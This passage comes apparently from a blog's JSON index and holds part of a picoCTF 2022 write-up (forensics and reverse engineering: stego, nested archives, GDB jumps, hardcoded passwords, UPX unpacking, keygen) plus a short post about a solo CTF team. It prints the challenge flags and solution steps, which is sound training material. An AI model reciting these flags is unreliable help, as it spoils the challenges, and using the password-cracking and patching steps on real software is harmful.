35  |picoCTF&#123;7h3r3_15|\n\n\n\n\n\n\n\nTIP\nAs a result, the flag is located at b1,rgb,lsb,xy, where rgb means it uses RGB channel, lsb means least significant bit comes first, and xy means pixel iteration order is from left to right.\n\nRedaction gone wrongIn the PDF, select the highlighted part and copy it. Paste it in a text file to see the\npicoCTF&#123;C4n_Y0u_S33_m3_fully&#125;\n\nFile typesThe point of this challenge is the type of files, you should check the file type every time with the file command\n$ file Flag.pdf\n   | \n   |-> shell archive text\n\n$ cp Flag.pdf Flag.sh\n$ chmod +x Flag.sh\n$ Flag.sh\n   |\n   |-> x - created lock directory _sh00046.\n       x - SKIPPING flag (file already exists)\n       x - removed lock directory _sh00046.\n\n# After executing, a file called flag was generated\n$ binwalk -e flag\n\n# created a new folder called _flag.extracted\n$ binwalk -e 64\n\n$ lzip -d -k flag\n\n$ lz4 -d flag.out flag2.out\n\n$ lzma -d -k flag2.lzma\n\n$ lzop -d -k flag2.lzop -o flag3\n\n$ lzip -d -k flag3\n\n$ xz -d -k flag4.xz\n\necho 7069636f4354467b66316c656e406d335f6d406e3170756c407431306e5f6630725f3062326375723137795f33343765616536357d0a | xxd -r -p\n\n\n\n\n\n\n\n\n\n\npicoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_347eae65}\n\nReverse Engineeringfile-run1We just need to execute the executable to obtain the flag.\n\n\n\n\n\n\n\n\n\npicoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}\nfile-run2This challenge provided an executable.\n\n\n\n\n\n\n\n\n\npicoCTF{F1r57_4rgum3n7_be0714da}\nGDB Test Drive$ chmod +x gdbme\n$ gdb gdbme\n(gdb) layout asm\n(gdb) break *(main+99)\n(gdb) run\n(gdb) jump *(main+104)\n\ngdb➤  jump *(main+104)\nContinuing at 0x800132f.\npicoCTF&#123;d3bugg3r_dr1v3_72bd8355&#125;\n[Inferior 1 (process 543) exited normally]\n\n\n\n\n\n\n\n\n\npicoCTF{d3bugg3r_dr1v3_197c378a}\npatchme.pyIf you look at the code, you will see that the password is hard coded\ndef level_1_pw_check():\n    user_pw = input(\"Please enter correct password for flag: \")\n    if( user_pw == \"ak98\" + \\\n                   \"-=90\" + \\\n                   \"adfjhgj321\" + \\\n                   \"sleuth9000\"):\n        print(\"Welcome back... your flag, user:\")\n        decryption = str_xor(flag_enc.decode(), \"utilitarian\")\n        print(decryption)\n        return\n    print(\"That password is incorrect\")\n\nThe password is: ak98-&#x3D;90adfjhgj321sleuth9000\n\n\n\n\n\n\n\n\n\npicoCTF{p47ch1ng_l1f3_h4ck_c4a4688b}\nSafe OpenerSee this part of the code:\npublic static boolean openSafe(String password) &#123;\n        String encodedkey = \"cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz\";\n        \n        if (password.equals(encodedkey)) &#123;\n            System.out.println(\"Sesame open\");\n            return true;\n        &#125;\n        else &#123;\n            System.out.println(\"Password is incorrect\\n\");\n            return false;\n        &#125;\n    &#125;\n\nAgain, the password key is hardcoded with base64 encoding. We just need to base64 decode it:\necho -n \"cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz\" | base64 -d\n\n\n\n\n\n\n\n\n\n\npicoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}\nbloat.pyThis section checks the password:\ndef arg133(arg432):\n  if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]:\n    return True\n  else:\n    print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\\\na[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\\\na[81]+a[68]+a[66]+a[83])\n    sys.exit(0)\n    return False\n\nThese characters are basically passwords:\narg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]\nAdd this line to the code\nprint(a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68])\npassword : happychance\n\n\n\n\n\n\n\n\n\npicoCTF{d30bfu5c4710n_f7w_b8062eec}\nFresh Java.\n.\n.\nif (string.charAt(3) != 'o') &#123;\n    System.out.println(\"Invalid key\");\n    return;\n&#125;\nif (string.charAt(2) != 'c') &#123;\n    System.out.println(\"Invalid key\");\n    return;\n&#125;\nif (string.charAt(1) != 'i') &#123;\n    System.out.println(\"Invalid key\");\n    return;\n&#125;\nif (string.charAt(0) != 'p') &#123;\n    System.out.println(\"Invalid key\");\n    return;\n&#125;\n\nAgain, hardcoded key, by concating it, we will get the flag.\n\n\n\n\n\n\n\n\n\npicoCTF{700l1ng_r3qu1r3d_738cac89}\nBbbbloatFrom the decompiled code, we can see after it was for favorite number, it performs some kind of comparison\nif (local_48 == 549255) &#123;\n\t__s = (char *)FUN_00101249(0,&amp;local_38);\n\tfputs(__s,stdout);\n\tputchar(10);\n\tfree(__s);\n&#125;\n./bbbbloat\nWhat's my favorite number? 549255\npicoCTF&#123;cu7_7h3_bl047_695036e3&#125;\n\n\n\n\n\n\n\n\n\n\npicoCTF{cu7_7h3_bl047_695036e3}\nunpackmeThe binary file was packed by using UPX, to unpack it, run the command below\nupx -d ./unpackme-upx\n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2018\nUPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018\n\n        File size         Ratio      Format      Name\n   --------------------   ------   -----------   -----------\n   1002408 &lt;-    439736   43.87%   linux/amd64   unpackme-upx\n\nUnpacked 1 file.\nLike the previous challenge, From the decompiled\nif (local_44 == 754635) &#123;\n\tlocal_40 = (char *)rotate_encrypt(0,&amp;local_38);\n\tfputs(local_40,(FILE *)stdout);\n\tputchar(10);\n\tfree(local_40);\n&#125;\n\n\n\n\n\n\n\n\n\n\npicoCTF{up&gt;&lt;_m3_f7w_77ad107e}\nKeygenmestrcpy(half_flag, \"picoCTF&#123;br1ng_y0ur_0wn_k3y_\");// half_flag_len = 27\n                                                // flag_len = 37\n                                                // \n  strcpy(v8, \"&#125;\");\n  strlen(half_flag);                            // 27\n  MD5();\n  strlen(v8);                                   // 1\n  MD5();\nFrom the code above, we can see half of the flag\npicoCTF&#123;br1ng_y0ur_0wn_k3y_\nfull_flag[59] = half_flag[45];\nfull_flag[60] = half_flag[50];\nfull_flag[61] = v10;\nfull_flag[62] = half_flag[33];\nfull_flag[63] = half_flag[46];\nfull_flag[64] = half_flag[56];\nfull_flag[65] = half_flag[58];\nfull_flag[66] = v10;\nfull_flag[67] = v8[0];\nThe value of each of these index in memory is equal to\n0x7d\n0x39\n0x38\n0x33\n0x36\n0x63\n0x64\n0x38\n\nusing Python to concat it\nn = [0x7d, 0x39, 0x38, 0x33, 0x36, 0x63, 0x64 ,0x38]\nn.reverse()\n\"\".join(list(map(lambda x:chr(x), n)))\n\n# 8dc6389&#125;\n\n\n\n\n\n\n\n\n\npicoCTF{br1ng_y0ur_0wn_k3y_19836cd8}\n","slug":"picoCTF2022","date":"2022-04-13T13:39:09.000Z","categories_index":"CTF,Security","tags_index":"Voynich,CTF-Team,CTF","author_index":"HSNHK"},{"id":"d9cafb537a39596a973d3a7abd6c9d29","title":"Voynich CTF Team","content":"Description\n\n\n\n\n\nTIP\nThe team is not formed properly at the moment and the information on this page may not be accurate and may change in the future\n\nVoynich is a CTF team that I founded on platforms like CTFtime or HackTheBox.\nCurrently, this team consists of one member, and it’s likely that other people will be added in the future. However, for now, I plan to manage it alone.\n\nctftime.org\n\nThe team is named after a book written in an unfamiliar script and language, and because it was an unknown to me, I chose this name to represent the team’s anonymity and mystery.\n\nVoynich manuscript\n\n\n\n\n\n\n\n\nTIP\nPlease introduce yourself below this post if you are interested in joining the team.\n\nTeam members\nHSNHK\n\n","slug":"Voynich","date":"2022-04-08T09:05:01.000Z","categories_index":"CTF,Security","tags_index":"Voynich,CTF-Team","author_index":"HSNHK"}]